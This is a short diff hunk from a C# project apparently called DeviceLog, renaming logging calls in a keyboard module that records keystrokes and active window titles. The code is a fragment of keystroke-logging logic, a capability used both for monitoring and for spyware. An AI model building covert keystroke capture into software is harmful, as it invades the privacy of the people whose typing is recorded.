@@ -111,15 +111,15 @@ namespace DeviceLog.Classes.Modules.Keyboard
                 {
                     if (!string.IsNullOrEmpty(_currentWindowTitle))
                     {
-                        _log.AddKey(Environment.NewLine);
+                        _log.AddData(Environment.NewLine);
                     }
-                    _log.AddKey("[" + title + "]");
-                    _log.AddKey(Environment.NewLine);
+                    _log.AddData("[" + title + "]");
+                    _log.AddData(Environment.NewLine);
 
                     _currentWindowTitle = title;
                 }
             }
-            _log.AddKey(key);
+            _log.AddData(key);
         }
 
         /// <summary>
